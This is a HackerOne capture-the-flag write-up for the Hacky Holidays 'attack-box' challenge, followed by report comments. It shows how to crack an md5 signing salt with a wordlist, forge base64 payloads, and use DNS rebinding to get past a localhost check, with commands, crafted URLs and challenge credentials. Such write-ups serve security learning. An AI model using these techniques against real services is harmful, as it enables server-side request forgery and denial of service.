The `launch` endpoint had a `payload` parameter with a base64 encoded value containing target argument (IP) and a hash, a sign that checked whether the payload was forged or not.

Firstly we had to forge our payloads, and I decided to check different hash algorithms like `md5(salt + pass)`, `md5(pass + salt)` or even `md5(md5(pass)+salt)`. The script found that the salt was `mrgrinch463`. From now on, we could supply any IP to the attack box.

I couldn't find Mr Grinch IP addresses, but thought that we could take out attack boxes by DDoSing `127.0.0.1`, but there is a check that stops an attack on the localhost. Sending different payloads, like an integer representation of an IP, or cname won't work, because the check does a `dig` lookup for an ip, and checks whether it is an internal one.

In order to bypass that check, I remembered about a DNS Rebinding attack, where the host changed the IP address after getting the first resolve (or by any other algorithm). There are a couple of services that help us to do this type of attack, but I stopped on `https://lock.cmpxchg8b.com/rebinder.html`. For the attack, I developed a script that would create links for us.

Using the hosts that I hard-coded in a script and their links it's possible to DDoS Grinch Networks.
We'll be redirected to the final page and get the last flag.

### Steps to reproduce
  * Navigate to https://hackyholidays.h1ctf.com/attack-box
  * Log in with username - `grinchadmin` and password - `s4nt4sucks`
  * Intercept requests with Burp Suite. Click on `Attack` button and notice requests that are being done
  * Notice a request to 

```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
```

  * payload parameter decodes into 

```
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

{F1140124}
  * Download the script {F1140135}
  * Lauch the script with target and hash values as first and second arguments for the script and a wordlist as the third.

```
python3 hash_target.py 203.0.113.33 5f2940d65ca4140cc18d0878bc398955 ~/Tools/lists/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

{F1140125}
  * To verify that  the salt is the same across different IPs, execute the command again with other values.

```
echo eyJ0YXJnZXQiOiIyMDMuMC4xMTMuNTMiLCJoYXNoIjoiMjgxNGY5YzczMTFhODJmMWI4MjI1ODUwMzlmNjI2MDcifQ== | base64 -d
```

  * The salt is `mrgrinch463` and an algorithm for hash - md5(salt + data_to_hash)
  * Localhost check bypass using DNS rebinding (You should try a couple times, as it may not work at first)
  * Download ssrf.py {F1140134}
  * Go to https://lock.cmpxchg8b.com/rebinder.html
  * Set A to 8.8.8.810 and B to 127.0.0.1 . Copy the result (it should be `0808080a.7f000001.rbndr.us`)
  * Execute ssrf.py script to get an attack links (I've hardcoded hosts you were looking into)

```
python3 ssrf.py mrgrinch463 
```

{F1140126}
  * Navigate to the links that you got (e.g. https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiAiMDgwODA4MGEuN2YwMDAwMDEucmJuZHIudXMiLCAiaGFzaCI6ICIyNTE5YTA1YzA3M2YxMmYxNzg3MTdkYTNlYjlhZDczMyJ9)    
{F1140131}
  * Once the attack works, you should be able to take down Grinch Networks - https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709

{F1140127}

### Key takeaways
Never give up, as I though to give up thrice on this challenge.
- **2020-12-31** @yso: @anyone If possible, could you please make my first Huge report smaller by just leaving files only, without content (second comment), and leave the last one. I made formatted it better, because the first one slipped :(
- **Report Resolved**
- **Agreed On Going Public**
- **2021-01-11** @nahamsec: Sorry, it's either limited or all of it.
- **2021-01-11** @yso: oh, okay then, @nahamsec let's go for all in:)

By the way, is it possible to look up which place I got in this CTF? (I hope there is some functionality that could track this results). 
And also will HackerOne release statistics about HackyHolidays CTF? (how many users solved at least 1 flag, how many solved the whole ctf, how much time did it take to solve each challenge for the first person to solve that challenge, etc.)?
- **2021-01-12** @nahamsec: Hey @yso - We currently don't have a point system to place people for each CTF. However, the (leaderboard)[https://hackerone.com/h1-cft/thanks]  is used as a place to show ranking for everyone participating in our CTFs.
- **Agreed On Going Public**
- **Report Became Public**
